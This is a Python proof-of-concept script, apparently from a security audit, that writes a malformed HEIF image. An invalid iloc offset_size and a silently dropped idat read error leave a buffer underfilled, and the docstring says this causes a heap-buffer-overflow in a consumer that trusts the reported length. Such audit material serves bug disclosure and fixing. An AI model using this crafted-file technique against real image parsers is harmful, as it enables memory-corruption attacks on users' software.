#!/usr/bin/env python3
"""bug06: iloc offset_size = 5 (invalid). Demonstrates the data-injection
primitive in the audit comment word-for-word.

We use construction_method=1 (idat path) with a tiny idat: when the
misalignment yields a huge extent.length, idat->read_data fails — and
that failure is silently dropped (bug09). dest ends up much smaller than
extent.length, so a downstream consumer that trusts the iloc-reported
length OOBs (real ASAN heap-buffer-overflow)."""

import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "common"))
import heif_box as hb


def main(out_path: str) -> None:
    idat_payload = b"\xAA" * 8       # tiny — only 8 bytes available
    bogus_iloc = hb.iloc(
        version=1,
        offset_size=5,         # invalid → 5 bytes written, parser ignores
        length_size=4,
        base_offset_size=0,
        index_size=0,
        items=[{
            "item_id": 1,
            "construction_method": 1,    # idat path
            "data_reference_index": 0,
            # 5-byte "offset" left unconsumed; parser's read32 for length
            # picks up the first 4 → extent.length = 0x12345678 (305 MiB).
            # Way bigger than the 8-byte idat → idat->read_data fails →
            # silently dropped → dest stays underfilled.
            "extents": [(0, 0x12345678_AB, 0xCAFEBABE)],
        }])

    payload = (hb.hdlr(b"pict") + hb.pitm(1) +
               hb.empty_iprp() + hb.iinf([(1, b"hvc1")]) + bogus_iloc +
               hb.idat(idat_payload))
    out = hb.ftyp() + hb.fullbox(b"meta", 0, 0, payload)
    hb.write_file(out_path, out)


if __name__ == "__main__":
    main(sys.argv[1] if len(sys.argv) > 1 else "bug06_poc.heif")
